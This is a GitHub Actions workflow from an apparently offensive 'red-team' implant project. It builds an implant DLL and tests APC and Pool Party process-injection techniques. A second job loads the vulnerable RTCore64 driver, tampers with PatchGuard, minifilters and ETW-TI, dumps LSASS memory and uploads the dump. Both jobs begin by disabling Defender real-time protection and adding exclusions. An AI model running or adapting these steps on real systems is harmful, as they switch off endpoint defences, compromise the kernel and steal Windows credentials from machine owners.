name: P4-P5 Real-machine Validation

# P4 (Foliage APC) + P5 (Pool Party) + kernelsdk BYOVD regression on hosted
# Windows runners.  Manual trigger conserves minutes; PR trigger on implant
# changes catches regressions before merge.  See docs/P4_P5_VALIDATION_STRATEGY.md.
#
# Authorized red-team security research project.

on:
  workflow_dispatch:       # manual trigger (saves minutes)
  pull_request:
    paths:
      - 'crates/implant-win/**'
      - '.github/workflows/p4-p5-validate.yml'

concurrency:
  group: p4-p5-${{ github.ref }}
  cancel-in-progress: true

env:
  CARGO_TERM_COLOR: always

jobs:
  # ==========================================================================
  # userland-validation — P4 (Foliage APC) + P5 (Pool Party) user-mode selftests
  # ==========================================================================
  userland-validation:
    runs-on: windows-latest   # Server 2025, Defender disabled by default
    timeout-minutes: 20       # Windows 2x multiplier -- caps burn
    env:
      # Arm P4/P5 research gates at build time so the selftest paths fire.
      NYX_FOLIAGE_APC_ON: "1"
      NYX_POOL_PARTY_ON: "1"

    steps:
      - uses: actions/checkout@v4

      # -- 1. Double-insurance: confirm Defender is off + add exclusions ---------
      - name: Disable Defender + add exclusions
        shell: powershell
        run: |
          $pref = (Get-MpPreference).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (image default): $pref"
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE\target" -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionProcess "cargo.exe","rundll32.exe" -Force -ErrorAction SilentlyContinue
          $now = (Get-MpPreference).DisableRealtimeMonitoring
          Write-Host "Defender realtime disabled (after step): $now"

      # -- 2. Toolchain: nightly + MSVC target ---------------------------------
      # MSVC target works reliably on all Windows versions including Server 2025
      # (build 26100).  GNU target (mingw-w64) has CRT startup compat issues on
      # Server 2025 causing STATUS_STACK_BUFFER_OVERRUN (0xC0000409) at DLL load.
      - name: Install Rust nightly (implant requires nightly + rust-src)
        uses: dtolnay/rust-toolchain@nightly
        with:
          components: rust-src
          targets: x86_64-pc-windows-msvc

      # -- 3. Build implant DLL -------------------------------------------------
      - name: Build implant DLL
        shell: bash
        run: |
          cargo +nightly build --release --target x86_64-pc-windows-msvc --manifest-path crates/implant-win/Cargo.toml

      # -- 4. Smoke test: can the DLL even be loaded? ---------------------------
      - name: SMOKE -- calib42 (exit 42, no syscalls)
        shell: pwsh
        run: |
          $dll = "$env:GITHUB_WORKSPACE\crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll"
          $p = Start-Process rundll32 -ArgumentList $dll,nyx_selftest_calib42 -PassThru -Wait -NoNewWindow
          $code = $p.ExitCode
          Write-Host "calib42 exit: 0x$($code.ToString('X8')) (decimal $code)"
          # Exit codes >= 0x80000000 indicate a crash (STATUS_*, exception).
          # Selftest exports call ExitProcess with a bitmask — the exit code IS the
          # test result (e.g. calib42 → 42, foliage bit0=1 → 1). Non-crash non-zero
          # exit codes are expected and indicate the selftest ran successfully.
          if ($code -ge 0x80000000) { throw "DLL load/run CRASHED (exit 0x$($code.ToString('X8')))" }
          Write-Host "PASS: DLL loads, calib42 ran (exit $code = expected 42)"

      # -- 5. P4 Foliage data-only baseline ------------------------------------
      - name: P4 baseline -- foliage data-only
        shell: pwsh
        continue-on-error: true
        run: |
          $dll = "$env:GITHUB_WORKSPACE\crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll"
          $p = Start-Process rundll32 -ArgumentList $dll,nyx_selftest_foliage -PassThru -Wait -NoNewWindow
          $code = $p.ExitCode
          Write-Host "foliage exit: 0x$($code.ToString('X8')) (bitmask $code)"
          if ($code -ge 0x80000000) { throw "CRASHED (exit 0x$($code.ToString('X8')))" }
          Write-Host "PASS: foliage exit $code (bit0=$($code -band 1), bit1=$($code -band 2))"

      # -- 6. P4 Foliage APC thunk ---------------------------------------------
      - name: P4 thunk -- foliage_apc
        shell: pwsh
        continue-on-error: true
        run: |
          $dll = "$env:GITHUB_WORKSPACE\crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll"
          $p = Start-Process rundll32 -ArgumentList $dll,nyx_selftest_foliage_apc -PassThru -Wait -NoNewWindow
          $code = $p.ExitCode
          Write-Host "foliage_apc exit: 0x$($code.ToString('X8')) (bitmask $code)"
          if ($code -ge 0x80000000) { throw "CRASHED (exit 0x$($code.ToString('X8')))" }
          Write-Host "PASS: foliage_apc exit $code"

      # -- 7. P5 Pool Party ----------------------------------------------------
      - name: P5 -- inject_pool
        shell: pwsh
        continue-on-error: true
        run: |
          $dll = "$env:GITHUB_WORKSPACE\crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll"
          $p = Start-Process rundll32 -ArgumentList $dll,nyx_selftest_inject_pool -PassThru -Wait -NoNewWindow
          $code = $p.ExitCode
          Write-Host "inject_pool exit: 0x$($code.ToString('X8')) (bitmask $code)"
          if ($code -ge 0x80000000) { throw "CRASHED (exit 0x$($code.ToString('X8')))" }
          Write-Host "PASS: inject_pool exit $code"

      # -- 8. Upload DLL artifact ----------------------------------------------
      - name: Upload DLL artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nyx-implant-win-dll
          path: crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll

  # ==========================================================================
  # kernelsdk-byovd — kernelsdk BYOVD regression (only if HVCI is OFF)
  # ==========================================================================
  # On hosted runners CodeIntegrityPolicyEnforcementStatus=2, so BYOVD cannot
  # load.  This job probes HVCI and skips when enforcement is on.  When a
  # self-hosted runner with HVCI off is attached, the full BYOVD path runs.
  kernelsdk-byovd:
    runs-on: windows-latest
    timeout-minutes: 15
    continue-on-error: true   # HVCI on → skip, don't fail the workflow
    steps:
      - uses: actions/checkout@v4

      # -- 0. Probe HVCI + vulnerable driver blocklist status -------------------
      - name: Probe HVCI + vulnerable driver blocklist status
        id: hvci_probe
        shell: powershell
        run: |
          Write-Host "=== Win32_DeviceGuard / VBS / HVCI status ==="
          $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
          $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
          Write-Host "=== Vulnerable Driver Blocklist registry ==="
          $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, empty=not set)"
          # CI policy enforced (CodeIntegrityPolicyEnforcementStatus=2) → BYOVD blocked
          $ci_enforced = ($dg.CodeIntegrityPolicyEnforcementStatus -eq 2)
          $hvci_running = ($dg.SecurityServicesRunning -contains 2)
          Write-Host "HVCI actively running: $hvci_running"
          Write-Host "CI policy enforced: $ci_enforced"
          if ($ci_enforced -or $hvci_running) {
            Write-Host "::warning::HVCI/CI policy is enforcing -- BYOVD (RTCore64) load blocked. Skipping kernelsdk job."
            echo "skip=true" >> $env:GITHUB_OUTPUT
          } else {
            Write-Host "::notice::HVCI NOT running + CI policy NOT enforced -- BYOVD load should succeed."
            echo "skip=false" >> $env:GITHUB_OUTPUT
          }

      - name: Skip — HVCI/CI policy blocks BYOVD
        if: steps.hvci_probe.outputs.skip == 'true'
        run: echo "Skipped kernelsdk BYOVD job (HVCI/CI policy is enforcing)."

      # -- 1-3. Only execute when HVCI is OFF ----------------------------------
      - name: Disable Defender
        if: steps.hvci_probe.outputs.skip == 'false'
        shell: powershell
        run: |
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue

      - name: Install Rust stable
        if: steps.hvci_probe.outputs.skip == 'false'
        uses: dtolnay/rust-toolchain@stable

      - name: Build operator-kernel-cli
        if: steps.hvci_probe.outputs.skip == 'false'
        run: cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml

      # -- 4. BYOVD real-machine regression (Task G-K + P0.a/b + P3.b) --------
      - name: kernelsdk BYOVD real-machine regression
        if: steps.hvci_probe.outputs.skip == 'false'
        shell: pwsh
        run: |
          # RTCore64.sys is .gitignore excluded — must be pre-provisioned.
          $driverPath = "$env:GITHUB_WORKSPACE\tools\RTCore64.sys"
          if (-not (Test-Path $driverPath)) {
            Write-Host "::warning::RTCore64.sys not found at $driverPath -- skipping BYOVD load."
            return
          }
          # Bootstrap (KslD → BYOVD fallback)
          .\target\release\nyx-kernel.exe bootstrap --byovd $driverPath NyaRTCore
          if ($LASTEXITCODE -ne 0) { throw "bootstrap failed (exit $LASTEXITCODE)" }
          # P0.a — PatchGuard window
          .\target\release\nyx-kernel.exe pg-window
          # P0.b — MiniFilter detach (build table auto-fallback)
          .\target\release\nyx-kernel.exe detach-minifilter
          # ETW-TI blind + DKOM hide + LSASS dump
          .\target\release\nyx-kernel.exe blind-etw
          $lsassPid = (Get-Process lsass).Id
          .\target\release\nyx-kernel.exe dump-lsass $lsassPid
          Write-Host "::notice::kernelsdk BYOVD full path passed (Task G-K + P0.a/b + P3.b)"

      - name: Upload kernel logs + LSASS dump
        if: always() && steps.hvci_probe.outputs.skip == 'false'
        uses: actions/upload-artifact@v4
        with:
          name: kernelsdk-byovd-logs
          path: |
            lsass_*.dmp
            target/release/*.log
